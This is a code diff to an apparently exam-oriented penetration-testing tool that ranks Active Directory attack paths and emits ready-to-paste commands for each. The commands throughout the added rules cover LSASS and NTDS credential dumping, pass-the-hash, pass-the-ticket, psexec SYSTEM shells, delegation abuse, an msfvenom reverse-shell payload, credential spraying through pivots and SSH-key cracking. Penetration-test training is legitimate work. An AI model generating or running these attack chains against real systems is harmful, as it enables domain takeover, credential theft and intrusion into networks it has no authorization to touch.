@@ -238,6 +238,25 @@ def _entities(report, store):
                 "target_kind": m.get("target_kind", ""),
                 "src": ev.source, "line": ev.line,
             })
+        # iter-312: PowerView Get-DomainObjectAcl rows (keyword.py kind="acl",
+        # iter-267) feed the SAME ACL-edge chains as BloodHound Aces[].
+        # ExtendedRight / WriteProperty are GUID-ambiguous without the
+        # ObjectAceType, so the keyword.py hint covers them instead.
+        if ev.kind == "acl" and (ev.meta or {}).get("right"):
+            m = ev.meta or {}
+            _r = {"WriteMember": "AddMember"}.get(m["right"], m["right"])
+            if _r not in ("ExtendedRight", "WriteProperty"):
+                _dn = m.get("dn", "")
+                _is_comp = ((ev.user or "").endswith("$") or ",CN=Computers," in _dn
+                            or "OU=Domain Controllers" in _dn)
+                e.acl_edges.append({
+                    "right": _r,
+                    "target": ev.user,
+                    "principal": m.get("principal_sid", ""),
+                    "ptype": "",
+                    "target_kind": "computers" if _is_comp else "",
+                    "src": ev.source, "line": ev.line,
+                })
         # iter-35: krbtgt NT hash -> golden ticket forgery. Highest-priority
         # chain when present because it gives Administrator against ANY
         # user in the domain, offline, no network.
@@ -277,6 +296,19 @@ def _machine(src, root):
 
 def run(report, store, ui=None):
     import os
+    # iter-312: a captured `net accounts` policy feeds the R1 spray lockout
+    # guard (enum4linux already does this via ingest; keyword.py's
+    # password_policy evidence did not). A locked-out DA = a failed AD set.
+    if getattr(store, "lockout_threshold", None) is None:
+        for _pp in store.by_kind("password_policy"):
+            _t = str((_pp.meta or {}).get("lockout_threshold", ""))
+            if _t.strip().lower() in ("never", "none"):
+                store.lockout_threshold = 0
+                break
+            _tm = re.search(r'\d+', _t)
+            if _tm:
+                store.lockout_threshold = int(_tm.group())
+                break
     e = _entities(report, store)
     root = getattr(report, "root", ".")
 
@@ -765,8 +797,11 @@ def run(report, store, ui=None):
         _kf = _sh_sq(s if s else "<keyfile>")
         chains.append(Chain("R17", "ssh key", "private key recovered",
             crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
+            # iter-312: the 2nd line used to start with prose ("if ENCRYPTED:"),
+            # which failed lint and silently dropped the WHOLE R17 chain.
             commands=[f"chmod 600 '{_kf}'; ssh -i '{_kf}' <user>@{sh}",
-                      f"if ENCRYPTED: ssh2john '{_kf}' > k; hashcat -m 22921 k rockyou.txt"],
+                      f"ssh2john '{_kf}' > k; hashcat -m 22921 k rockyou.txt   "
+                      f"# only if the key is passphrase-ENCRYPTED"],
             src=s, line=l))
     # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
     # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
@@ -783,7 +818,8 @@ def run(report, store, ui=None):
         chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
             crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
             commands=[f"certipy auth -pfx '{_pfx_path}' -password '<pfx-password-if-set>' -dc-ip {dc()}",
-                      "then PtH the recovered NT hash (see R7)"], src=s, line=l))
+                      # iter-312: was bare prose -> lint fail -> R16 dropped.
+                      "# then PtH the recovered NT hash (see R7)"], src=s, line=l))
     # ccache / kirbi. iter-16: removed literal '-FQDN' suffix on dc() that
     # produced an unresolvable hostname '10.10.10.5-FQDN'. Kerberos requires
     # the DC's actual FQDN (the SPN in the ticket), so we tell the operator
@@ -1955,6 +1991,10 @@ def run(report, store, ui=None):
                 ],
                 src=os.path.join(d, "NTDS.dit")))
 
+    # iter-312: landed-evidence rules (Pwn3d!/shell/TGT/S4U/hives/pivot/
+    # privesc/MSF quota) - see _rules_landed() below.
+    chains.extend(_rules_landed(e, report, store, root, admincount_users))
+
     # ── dedup identical chains across files (keep best score, sum counts) ──
     by_key = {}
     for c in chains:
@@ -2008,3 +2048,524 @@ def _prox(store, host):
         if x.host == host and x.fact == "dc":
             return 1.0
     return 0.7
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# iter-312: LANDED-EVIDENCE RULES
+# keyword.py / privesc.py emit ~20 evidence kinds that record an attack that
+# already LANDED (Pwn3d!, shell prompt, TGT minted, S4U done, hive staged,
+# tunnel up, privesc vector held). Before iter-312 nothing here read them, so
+# the ranked ATTACK PATH ignored the operator's strongest positions. These
+# rules turn each landed position into its exam-legal finishing move.
+# Every command below is linted by the gate in run(); prose lives behind '#'.
+# ═══════════════════════════════════════════════════════════════════════════
+_NT_BLANK_LM = "aad3b435b51404eeaad3b435b51404ee"
+# probe-only alias: R-PRIVESC uses it to decide "runnable vs #-comment" per
+# hint segment. The compliance GATE in run() still calls
+# compliance.lint_command on every emitted line - this alias never bypasses it.
+_probe_lint = compliance.lint_command
+_PIVOT_PORTS = "21,22,80,88,135,139,389,443,445,1433,3389,5985,8080"
+
+
+def _norm_user(u):
+    """'CORP\\Alice' / 'alice@corp.local' / 'Alice' -> 'alice'."""
+    u = (u or "").strip()
+    if "\\" in u:
+        u = u.rsplit("\\", 1)[1]
+    if "@" in u:
+        u = u.split("@", 1)[0]
+    return u.lower()
+
+
+class _Auth:
+    """credential material for one owned principal, rendered per tool."""
+    __slots__ = ("user", "pw", "nt")
+
+    def __init__(self, user, pw="", nt=""):
+        self.user, self.pw, self.nt = user, pw, nt
+
+    @property
+    def nxc(self):
+        u = _sh_sq(self.user)
+        if self.pw:
+            return f"-u '{u}' -p '{_sh_sq(self.pw)}'"
+        return f"-u '{u}' -H '{self.nt}'"
+
+    def uri(self, dom, host):
+        u, d = _sh_sq(self.user), _sh_sq(dom)
+        if self.pw:
+            return f"'{d}/{u}:{_sh_sq(self.pw)}'@{host}"
+        return f"-hashes '{_NT_BLANK_LM}:{self.nt}' '{d}/{u}'@{host}"
+
+
+_PLACEHOLDER_AUTH = None   # sentinel: callers fall back to <user>/<pw>
+
+
+def _auth_for(e, user):
+    """plaintext first, then NT hash, for the named principal."""
+    want = _norm_user(user)
+    if not want:
+        return None
+    for (ulc, pw), occs in sorted(e.creds.items()):
+        if _norm_user(ulc) == want or any(_norm_user(o[0]) == want for o in occs):
+            return _Auth(occs[0][0] if occs[0][0] != "<user>" else ulc, pw=pw)
+    for h, occs in sorted(e.nt.items()):
+        for hu, _hs, _hl in occs:
+            if hu and _norm_user(hu) == want:
+                return _Auth(hu, nt=h)
+    return None
+
+
+def _any_auth(e):
+    """any owned principal (kerberoast / spray / scan inside a subnet)."""
+    for (ulc, pw), occs in sorted(e.creds.items()):
+        u = occs[0][0] if occs[0][0] != "<user>" else ulc
+        if u and u != "<user>":
+            return _Auth(u, pw=pw)
+    for h, occs in sorted(e.nt.items()):
+        for hu, _hs, _hl in occs:
+            if hu:
+                return _Auth(hu, nt=h)
+    return None
+
+
+def _fqdn_for(store, h):
+    names = [n for n in store.names_for(h) if "." in n] if h else []
+    return max(names, key=len) if names else ""
+
+
+def _rules_landed(e, report, store, root, admincount_users):
+    import os
+    chains = []
+    dom = store.dominant_domain() or "<dom>"
+    dc_ip = store.dc_ip() or "<DC-IP>"
+    dc_fqdn = store.dc_fqdn() or "<DC-FQDN>"
+    dc_canon = store.canon(store.dc_ip()) if store.dc_ip() else ""
+
+    def is_da(u):
+        n = _norm_user(u)
+        return bool(n) and (n in admincount_users or n == "administrator"
+                            or n.startswith(("da_", "da-")) or n.endswith("_da"))
+
+    def is_dc_host(h):
+        if not h:
+            return False
+        c = store.canon(h)
+        if dc_canon and c == dc_canon:
+            return True
+        return any(x.fact == "dc" and x.host == c for x in store.by_kind("host"))
+
+    # ── R-MSF-QUOTA: meterpreter used more than once (exam compliance) ──
+    mtp = [ev for ev in store.by_kind("msfvenom_payload")
+           if (ev.meta or {}).get("meterpreter") == "True"]
+    if len(mtp) >= 2:
+        dirs = sorted({_machine(ev.source, root) for ev in mtp} - {""})
+        blown = len(dirs) >= 2
+        cmds = ["# OSCP+ QUOTA: a meterpreter payload IS Metasploit use - ONE target "
+                "machine for the whole exam, locked at first use; a failed attempt "
+                "grants NO second target; `check` against another host counts; "
+                "Metasploit pivoting is forbidden"]
+        for ev in mtp[:4]:
+            m = ev.meta or {}
+            cmds.append(f"# {m.get('payload', '?')} -> {m.get('outfile', '?')} "
+                        f"LHOST={m.get('lhost', '?')}:{m.get('lport', '?')}  "
+                        f"({os.path.basename(ev.source or '?')}:{ev.line})")
+        cmds.append("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=443 "
+                    "-f exe -o rev.exe   # quota-free on EVERY box: only meterpreter "
+                    "binds the quota; catch it with nc -lvnp 443")
+        if blown:
+            cmds.append("# fired at two different machines? expect 0 points for the "
+                        "second - keep MSF on ONE box, redo the other manually")
+        chains.append(Chain(
+            "R-MSF-QUOTA", "Metasploit quota",
+            (f"{len(mtp)} METERPRETER payloads across {max(1, len(dirs))} loot "
+             f"dir(s) [{', '.join(dirs[:4]) or 'same dir'}] - "
+             + ("QUOTA BLOWN? Metasploit is ONE machine for the whole exam"
+                if blown else "verify they all target the SAME machine")),
+            crit=10, conf=1.0 if blown else 0.8, ready=1.6 if blown else 1.5,
+            prox=1.0, commands=cmds, src=mtp[0].source, line=mtp[0].line,
+            count=len(mtp)))
+
+    # ── owned hosts: Pwn3d! admin, shell prompts, MSSQL-as-SYSTEM ──
+    owned = {}      # canon host -> (user, src, line, how)
+    for ev in store.by_kind("admin"):
+        if ev.host:
+            owned.setdefault(store.canon(ev.host),
+                             (ev.user, ev.source, ev.line, "Pwn3d!", ev.domain or ""))
+    for ev in store.by_kind("shell_landed"):
+        h = ev.host or (ev.meta or {}).get("target", "")
+        if h:
+            owned.setdefault(store.canon(h),
+                             ("", ev.source, ev.line,
+                              (ev.meta or {}).get("method", "shell"), ev.domain or ""))
+    sessions = store.by_kind("logged_on_session")
+    exclusions = {ev.source: (ev.meta or {}).get("path", "")
+                  for ev in store.by_kind("defender_exclusion")}
+    for h, (ou, src, line, how, odom) in sorted(owned.items()):
+        auth = _auth_for(e, ou) if ou else None
+        hdom = odom or dom
+        nxc = auth.nxc if auth else "-u '<user>' -p '<pw>'"
+        uri = auth.uri(hdom, h) if auth else f"'{_sh_sq(hdom)}/<user>:<pw>'@{h}"
+        sess = [s for s in sessions
+                if ((s.host and store.canon(s.host) == h)
+                    or (not s.host and s.source == src))
+                and _norm_user(s.user) != _norm_user(ou)]
+        da_sess = [s for s in sess if is_da(s.user)]
+        on_dc = is_dc_host(h)
+        who = ou or "operator"
+        if da_sess or sess:
+            pick = da_sess or sess
+            names = ", ".join(sorted({f"{s.domain}\\{s.user}" if s.domain else s.user
+                                      for s in pick})[:3])
+            cmds = [f"netexec smb {h} {nxc} -M lsassy   # {names} logged on here - "
+                    f"LSASS holds their NT hash / TGT",
+                    f"netexec smb {h} {nxc} --lsa --sam   # LSA secrets, DCC2 "
+                    f"cached creds, local SAM",
+                    f"impacket-secretsdump {uri}   # same loot, no tool drop"]
+            if da_sess:
+                cmds.append("# DA NT hash -> R7 PtH to the DC -> impacket-secretsdump "
+                            "-just-dc (krbtgt -> R-GOLDEN)")
+            if exclusions.get(src):
+                cmds.append(f"# Defender exclusion captured: {exclusions[src]} - stage "
+                            f"tooling there if lsassy is blocked")
+            chains.append(Chain(
+                "R-LSASS-NOW", "dump LSASS on owned host",
+                f"{who} owns {h} ({how}); "
+                + (f"DA session {names} active -> dump LSASS now" if da_sess
+                   else f"session(s) {names} active -> dump LSASS"),
+                crit=10 if da_sess else 8, conf=0.9 if da_sess else 0.8,
+                ready=1.5, prox=1.0 if da_sess else 0.9,
+                commands=cmds, src=src, line=line, count=len(sess)))
+            continue
+        if how == "Pwn3d!":
+            cmds = [f"impacket-psexec {uri}   # SYSTEM shell (Pwn3d! = local admin)",
+                    f"impacket-wmiexec {uri}   # quieter: no service creation"]
+            if on_dc:
+                cmds.append(f"impacket-secretsdump -just-dc {uri}   # admin on a DC = "
+                            f"every domain hash; krbtgt -> R-GOLDEN")
+            else:
+                cmds.append(f"impacket-secretsdump {uri}   # SAM + LSA + DCC2")
+            chains.append(Chain(
+                "R-PSEXEC", "admin shell",
+                f"{who} is local admin on {h}"
+                + (" (a DOMAIN CONTROLLER)" if on_dc else "")
+                + " -> SYSTEM shell + dump",
+                crit=10 if on_dc else 8, conf=0.95 if auth else 0.7, ready=1.5,
+                prox=1.0 if on_dc else 0.85,
+                commands=cmds, src=src, line=line))
+        else:
+            chains.append(Chain(
+                "R-OWNED-DUMP", "dump owned host",
+                f"shell landed on {h} ({how}) -> dump SAM/LSA/DCC2",
+                crit=7, conf=0.85, ready=1.5, prox=0.8,
+                commands=[f"netexec smb {h} {nxc} --lsa --sam",
+                          f"impacket-secretsdump {uri}",
+                          "# from the shell itself: reg save HKLM\\SAM / SYSTEM / "
+                          "SECURITY, pull them, then secretsdump LOCAL (R-HIVE-OFFLINE)"],
+                src=src, line=line))
+
+    # ── R-PTT-LATERAL: ccache / pfx / Rubeus TGT -> pass-the-ticket ──
+    lateral = []
+    for hh in store.hosts_with_service(("smb", "winrm"))[:3]:
+        lateral.append(_fqdn_for(store, hh) or "<host-fqdn>")
+    lateral = sorted(set(lateral))[:2] or ["<host-fqdn>"]
+    ccache_local = os.path.basename(e.ccache_src[0]) if getattr(e, "has_ccache", False) else ""
+    seen_ptt = set()
+    for kind, ready, tool in (("ccache", 1.5, "impacket/certipy"),
+                              ("pfx", 1.3, "certipy"),
+                              ("tgt_landed", 1.2, "Rubeus asktgt")):
+        for ev in store.by_kind(kind):
+            u = ev.user or "<user>"
+            key = (_norm_user(u), kind)
+            if key in seen_ptt:
+                continue
+            m = ev.meta or {}
+            if kind == "ccache" and ccache_local and \
+                    os.path.basename(m.get("path", "")) == ccache_local:
+                continue                         # file already in loot -> R26
+            seen_ptt.add(key)
+            us = _sh_sq(_norm_user(u) or "user")
+            d = ev.domain or dom
+            cmds = []
+            if kind == "tgt_landed":
+                cmds += ["# Rubeus printed base64(ticket.kirbi) on the target - paste it on Kali:",
+                         f"echo '<base64-kirbi>' | base64 -d > {us}.kirbi; "
+                         f"impacket-ticketConverter {us}.kirbi {us}.ccache"]
+                path = f"{us}.ccache"
+            elif kind == "pfx":
+                cmds.append(f"certipy-ad auth -pfx '{_sh_sq(m.get('path', '<file.pfx>'))}' "
+                            f"-dc-ip {dc_ip} -domain {d}   # prints NT hash (-> R7) and "
+                            f"saves {us}.ccache")
+                path = f"{us}.ccache"
+            else:
+                path = m.get("path") or f"{us}.ccache"
+            ps = _sh_sq(path)
+            cmds.append(f"export KRB5CCNAME='{ps}'; klist   # confirm principal + expiry")
+            for fq in lateral:
+                cmds.append(f"export KRB5CCNAME='{ps}'; impacket-psexec -k -no-pass "
+                            f"-dc-ip {dc_ip} '{_sh_sq(d)}/{us}@{fq}'")
+            da = is_da(u)
+            if da:
+                cmds.append(f"export KRB5CCNAME='{ps}'; impacket-secretsdump -k -no-pass "
+                            f"-dc-ip {dc_ip} -just-dc '{_sh_sq(d)}/{us}@{dc_fqdn}'   "
+                            f"# every domain hash")
+            chains.append(Chain(
+                "R-PTT-LATERAL", "pass-the-ticket",
+                f"Kerberos ticket for {d}\\{u} ({tool}) -> pass-the-ticket to "
+                f"{', '.join(lateral)}",
+                crit=10 if da else 8, conf=0.95 if da else 0.85, ready=ready,
+                prox=1.0 if da else 0.9, commands=cmds, src=ev.source,
+                line=ev.line, count=len(lateral)))
+
+    # ── R-DELEG-LANDED: Rubeus s4u complete -> consume the ticket ──
+    seen_dl = set()
+    for ev in store.by_kind("delegation_landed"):
+        m = ev.meta or {}
+        imp_raw = ev.user or m.get("impersonated") or "administrator"
+        spn = m.get("target_spn", "")
+        key = (_norm_user(imp_raw), spn.lower())
+        if not spn or key in seen_dl:
+            continue
+        seen_dl.add(key)
+        imp = _sh_sq(_norm_user(imp_raw))
+        parts = spn.split("/")
+        cls = parts[0].lower()
+        spn_host = (parts[1] if len(parts) >= 2 else spn).split(":", 1)[0]
+        on_dc = is_dc_host(spn_host) or spn_host.lower() == dc_fqdn.lower()
+        conv = (f"echo '<base64-kirbi>' | base64 -d > {imp}.kirbi; "
+                f"impacket-ticketConverter {imp}.kirbi {imp}.ccache")
+        base = f"export KRB5CCNAME={imp}.ccache; "
+        auth_tgt = f"'{_sh_sq(dom)}/{imp}@{spn_host}'"
+        cmds = ["# the S4U2Proxy ticket was printed by Rubeus s4u on the pivot host "
+                "(base64) - paste it on Kali:", conv]
+        if cls in ("cifs", "host", "restrictedkrbhost", "ldap"):
+            cmds.append(base + f"impacket-secretsdump -k -no-pass -dc-ip {dc_ip} {auth_tgt}"
+                        + (" -just-dc   # every domain hash -> R-GOLDEN" if on_dc
+                           else f"   # SAM + LSA of {spn_host}"))
+            if cls != "ldap":
+                cmds.append(base + f"impacket-psexec -k -no-pass -dc-ip {dc_ip} {auth_tgt}")
+        elif cls == "mssqlsvc":
+            cmds.append(base + f"impacket-mssqlclient -k -no-pass -windows-auth {auth_tgt}"
+                        f"   # then enable_xp_cmdshell")
+        else:
+            cmds.append(f"# {cls}/ SPN is service-specific: the ticket authenticates as "
+                        f"{imp} only to {spn_host}")
+            cmds.append(base + f"impacket-psexec -k -no-pass -dc-ip {dc_ip} {auth_tgt}")
+        cmds.append("# KRB_AP_ERR_SKEW -> match the DC clock (nmap smb2-time / "
+                    "rdate-style offset), then retry")
+        chains.append(Chain(
+            "R-DELEG-LANDED", "delegation landed",
+            f"delegation abuse LANDED: {imp_raw} impersonated to {spn} (Rubeus s4u) "
+            f"-> consume the ticket from Kali",
+            crit=10, conf=0.9, ready=1.3, prox=1.0 if on_dc else 0.9,
+            commands=cmds, src=ev.source, line=ev.line))
+
+    # ── R-HIVE-OFFLINE: staged reg save / VSS / IFM -> pull + LOCAL dump ──
+    groups = {}
+    for ev in store.by_kind("hive_file") + store.by_kind("ntds_dump"):
+        g = groups.setdefault(ev.source, {"names": {}, "ifm": "", "ev": ev, "how": set()})
+        m = ev.meta or {}
+        if ev.kind == "ntds_dump":
+            g["ifm"] = m.get("path", "") or g["ifm"]
+            g["how"].add("ntdsutil IFM")
+            continue
+        n = (m.get("hive") or m.get("artifact") or "").upper()
+        n = "NTDS.DIT" if "NTDS" in n else n
+        if n:
+            g["names"][n] = m.get("path", "")
+        g["how"].add("VSS" if m.get("extraction") == "vss" else "reg save")
+    local_sets = [set(v) for v in (getattr(e, "sam_dirs", {}) or {}).values()] \
+        if isinstance(getattr(e, "sam_dirs", None), dict) else []
+    for src, g in sorted(groups.items()):
+        names, ifm, ev0 = g["names"], g["ifm"], g["ev"]
+        how = "/".join(sorted(g["how"]))
+        hostv = "<host>"
+        for h, (ou, osrc, _l, _how, _od) in owned.items():
+            if osrc == src:
+                hostv = h
+                break
+        pull = []
+        for n, pth in sorted(names.items())[:3]:
+            if pth:
+                pull.append(f"netexec smb {hostv} -u '<user>' -p '<pw>' --get-file "
+                            f"'{_sh_sq(pth)}' {n.lower().replace('.dit', '')}.hiv")
+            else:
+                pull.append(f"# evil-winrm: download the extracted {n} to Kali")
+        if ifm or {"NTDS.DIT", "SYSTEM"} <= set(names):
+            if any({"ntds", "system"} <= s for s in local_sets):
+                continue                                    # R3D already fires
+            if ifm:
+                ii = _sh_sq(ifm.replace("\\", "/"))
+                dump = (f"impacket-secretsdump -ntds '{ii}/Active Directory/ntds.dit' "
+                        f"-system '{ii}/registry/SYSTEM' LOCAL   # paths of your local copy")
+            else:
+                dump = "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile dc_dump"
+            chains.append(Chain(
+                "R-HIVE-OFFLINE", "staged NTDS",
+                f"NTDS.dit + SYSTEM staged on {hostv} ({how}) -> pull to Kali, "
+                f"secretsdump LOCAL",
+                crit=10, conf=0.85, ready=1.2, prox=0.9,
+                commands=["# the dump is STAGED on the target - pull it to Kali first:"]
+                + pull + [dump, "# krbtgt NT hash -> R-GOLDEN; every user hash -> R7 PtH"],
+                src=src, line=ev0.line, count=len(names) or 1))
+        elif {"SAM", "SYSTEM"} <= set(names):
+            if any({"sam", "system"} <= s for s in local_sets):
+                continue                                    # R3T already fires
+            sec = " -security SECURITY.hiv" if "SECURITY" in names else ""
+            chains.append(Chain(
+                "R-HIVE-OFFLINE", "staged SAM",
+                f"SAM + SYSTEM{' + SECURITY' if sec else ''} staged on {hostv} ({how}) "
+                f"-> pull to Kali, secretsdump LOCAL",
+                crit=7, conf=0.85, ready=1.2, prox=0.7,
+                commands=["# hives are STAGED on the target - pull them to Kali first:"]
+                + pull + [f"impacket-secretsdump -sam sam.hiv -system system.hiv{sec} LOCAL",
+                          "# local hashes: PtH the ORIGINATING host with --local-auth; "
+                          "SECURITY gives DCC2 + service passwords"],
+                src=src, line=ev0.line, count=len(names)))
+
+    # ── R-PIVOT-SCAN: tunnel is up -> scan the hosts seen but never scanned ──
+    piv_by_m = {}
+    for ev in store.by_kind("pivot_landed"):
+        piv_by_m.setdefault(_machine(ev.source, root), []).append(ev)
+    if piv_by_m:
+        seen_h = set()
+        for ev in store.items:
+            if ev.host and ev.kind in ("host", "logged_on_session", "admin", "trust",
+                                       "local_admin", "pivot_landed"):
+                seen_h.add(store.canon(ev.host))
+        for ev in store.by_kind("pivot_landed"):
+            m = ev.meta or {}
+            for k in ("connect_addr", "dest_addr"):
+                if m.get(k):
+                    seen_h.add(store.canon(m[k]))
+        scanned = {store.canon(ev.host) for ev in store.by_kind("service") if ev.host}
+        unscanned = sorted(h for h in seen_h - scanned
+                           if h and not h.startswith("<")
+                           and (re.match(r'^\d{1,3}(\.\d{1,3}){3}$', h) or "." in h))
+        own = _any_auth(e)
+        for mach, evs in sorted(piv_by_m.items()):
+            def _active(x):
+                m = x.meta or {}
+                return ((m.get("tool") == "chisel" and m.get("role") == "client")
+                        or (m.get("tool") == "ligolo-ng" and m.get("role") == "proxy")
+                        or m.get("flag") in ("-D", "-L")
+                        or m.get("tool") in ("netsh_portproxy", "socat"))
+            act = [x for x in evs if _active(x)]
+            best = (act or evs)[0]
+            bm = best.meta or {}
+            tool = bm.get("tool", "tunnel")
+            mode = ("route" if tool == "ligolo-ng" else
+                    "socks" if (tool == "chisel" or bm.get("flag") == "-D") else "fwd")
+            tgt = " ".join(unscanned[:6]) or "<internal-cidr>"
+            pre = "" if mode == "route" else "proxychains -q "
+            cmds = []
+            if mode == "route":
+                cmds.append("# ligolo: session ; start --tun ligolo ; then as root add a "
+                            "kernel route for the internal subnet via the ligolo iface")
+            if mode == "fwd":
+                cmds.append(f"# port-forward ({tool}) - connect to the LISTEN side; "
+                            f"forwards to {bm.get('connect_addr') or bm.get('dest_addr') or '<dst>'}"
+                            f":{bm.get('connect_port') or bm.get('dest_port') or '<port>'}")
+            else:
+                cmds.append(f"{pre}nmap -sT -Pn -n --open -p {_PIVOT_PORTS} {tgt}"
+                            + ("   # -sT: SOCKS cannot carry SYN scans" if pre else ""))
+            if own and mode != "fwd":
+                ul = "users.txt" if _userlist(e) else f"'{_sh_sq(own.user)}'"
+                cred = (f"-p '{_sh_sq(own.pw)}'" if own.pw else f"-H '{own.nt}'")
+                cmds.append(f"{pre}netexec smb {tgt} -u {ul} {cred} --continue-on-success"
+                            f"   # reuse owned creds inside the subnet")
+            cmds.append("# REPORT: document every pivot - attacker -> pivot host -> "
+                        "internal subnet, with the exact tunnel command")
+            chains.append(Chain(
+                "R-PIVOT-SCAN", "pivot scan",
+                f"pivot via {tool} is UP ({mach or 'loot'}) - "
+                + (f"{len(unscanned)} internal host(s) seen but never scanned: "
+                   f"{', '.join(unscanned[:3])}" + (" ..." if len(unscanned) > 3 else "")
+                   if unscanned else "scan the internal range"),
+                crit=7, conf=0.85 if act else 0.5, ready=1.4, prox=0.8,
+                commands=cmds, src=best.source, line=best.line, count=len(evs)))
+
+    # ── R-PRIVESC: standalone privilege escalation (privesc.py) ──
+    # 10 of every standalone box's 20 points. Join each privesc_vector record
+    # with its PRIVESC finding for the operator-facing detail + hint, then
+    # surface the strongest vectors per loot machine in the ATTACK PATH.
+    pf = {}
+    for f in report.findings:
+        if f.get("category") == "PRIVESC":
+            pf.setdefault((f.get("file"), f.get("line")), f)
+    rank = {"CRITICAL": 0, "HIGH": 1}
+    cand = {}
+    for ev in store.by_kind("privesc_vector"):
+        f = pf.get((ev.source, ev.line))
+        if not f or f.get("severity") not in rank:
+            continue
+        mach = _machine(ev.source, root)
+        tech = (ev.meta or {}).get("technique") or ev.fact or "privesc"
+        key = (mach, tech)
+        cur = cand.get(key)
+        if cur is None or rank[f["severity"]] < rank[cur[1]["severity"]]:
+            cand[key] = (ev, f)
+    # keyword.py still owns several classic privesc markers (sudo NOPASSWD
+    # GTFOBins rows, -rws ls rows, getcap, tar wildcards, AIE, NFS, docker
+    # group, unquoted paths). They carry no privesc_vector evidence, so take
+    # the findings directly, keyed by technique so a box never ranks the same
+    # technique twice (privesc.py + keyword.py).
+    _KW_PRIVESC = (
+        ("sudo -l NOPASSWD", "sudo_nopasswd"),
+        ("SUID-root GTFOBins-able binary", "suid_gtfobins"),
+        ("capability cap_", "capability"),
+        ("wildcard-injection candidate", "cron_wildcard"),
+        ("AlwaysInstallElevated", "always_install_elevated"),
+        ("NFS export no_root_squash", "nfs_no_root_squash"),
+        ("docker group membership", "group_docker"),
+        ("Unquoted service path", "unquoted_path"),
+    )
+
+    class _KwEv:
+        __slots__ = ("source", "line", "meta", "fact")
+
+        def __init__(self, f, tech):
+            self.source, self.line, self.fact = f.get("file"), f.get("line"), tech
+            self.meta = {"technique": tech,
+                         "os": "windows" if tech in ("always_install_elevated",
+                                                     "unquoted_path") else "linux"}
+
+    for f in report.findings:
+        if f.get("severity") not in rank or f.get("category") == "PRIVESC":
+            continue
+        d = f.get("detail") or ""
+        for pre, tech in _KW_PRIVESC:
+            if d.startswith(pre):
+                key = (_machine(f.get("file"), root), tech)
+                cur = cand.get(key)
+                if cur is None or rank[f["severity"]] < rank[cur[1]["severity"]]:
+                    cand[key] = (_KwEv(f, tech), f)
+                break
+    per_m = {}
+    for (mach, tech), (ev, f) in sorted(cand.items(),
+                                        key=lambda kv: (rank[kv[1][1]["severity"]],
+                                                        kv[0])):
+        if per_m.get(mach, 0) >= 3:
+            continue
+        per_m[mach] = per_m.get(mach, 0) + 1
+        crit_sev = f["severity"] == "CRITICAL"
+        cmds = []
+        for seg in re.split(r"\s+\|\s+|\s+;\s+", f.get("hint") or "")[:4]:
+            seg = seg.strip()
+            if not seg:
+                continue
+            ok, _ = _probe_lint(seg)
+            cmds.append(seg if ok and not seg.startswith("#") else "# " + seg.lstrip("# "))
+        if not cmds:
+            cmds = [f"# see PRIVESC finding: {f['detail']}"]
+        osn = (ev.meta or {}).get("os", "")
+        proof = ("type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & ipconfig"
+                 if osn == "windows" else "cat /root/proof.txt; whoami; ip a")
+        cmds.append(f"# proof screenshot (one frame): {proof}")
+        chains.append(Chain(
+            "R-PRIVESC", "standalone privesc",
+            f"{mach or 'loot'}: {f['detail']}",
+            crit=8 if crit_sev else 7, conf=0.9 if crit_sev else 0.8,
+            ready=1.5 if crit_sev else 1.3, prox=1.0,
+            commands=cmds, src=ev.source, line=ev.line))
+    return chains
